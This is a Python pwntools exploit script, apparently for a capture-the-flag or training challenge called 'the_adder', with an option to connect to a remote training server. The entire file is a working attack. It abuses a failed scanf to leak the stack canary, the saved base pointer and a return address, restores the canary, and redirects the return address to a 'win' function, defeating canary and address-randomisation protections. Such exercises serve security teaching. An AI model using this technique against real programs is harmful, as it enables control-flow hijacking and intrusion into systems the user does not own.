from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./the_adder")
		gdb.attach(p, """
		# b *add_value
		b *adder+310
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./the_adder"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2012)
else:
	p = process("./the_adder")

def add_num(num, leak=False):
	p.recvuntil(b'> ')
	p.sendline(b'1')
	p.recvuntil(b'Number: ')
	p.sendline(num)
	leak_val = 0
	if(leak):
		p.recvuntil(b'add ')
		leak_val = int(p.recvuntil(b'?')[:-1])
	else:
		p.recvuntil(b'[y/n]')
		p.sendline(b'y')
	return leak_val

def sum_history():
	p.recvuntil(b'> ')

	p.sendline(b'2')
	print(p.recv())

def quit():
	p.recvuntil(b'> ')
	p.sendline(b'3')

for i in range(9): # fill the sum table: we must assure that the total sum is 0 in order to not mess up the canary
	add_num(b'1')
add_num(b'-9')

ret_from_adder_offset = 0x001008dd
win_offset = 0x00100bfc

# Leak and Restore Canary
canary = add_num(b"a", leak=True) # Let the scanf fail :)

print("!!! canary !!!:", hex(canary))
add_num(b'%d' % canary)

# Leak and Restore the rbp
leak_rbp = add_num(b"a", leak=True) # Let the scanf fail :)

print("!!! saved_rbp !!!:", hex(leak_rbp))
add_num(b'%d' % (leak_rbp - canary)) # Because canary is the current value, then canary + leak_rbp - canary = leak_rbp

# Leak and Overwrite the return address with the win function
leak_ret_from_adder = add_num(b"a", leak=True) # Let the scanf fail :)
base_addr = leak_ret_from_adder - ret_from_adder_offset
win = base_addr + win_offset

print("!!! leak_ret_from_adder !!!:", hex(leak_ret_from_adder))
print("!!! base_addr !!!:", hex(base_addr))
print("!!! win_addr !!!:", hex(win))

add_num(b'%d' % (win - leak_rbp)) # Because leak_rbp is the current value, then leak_rbp + win - leak_rbp = win

quit()

p.interactive()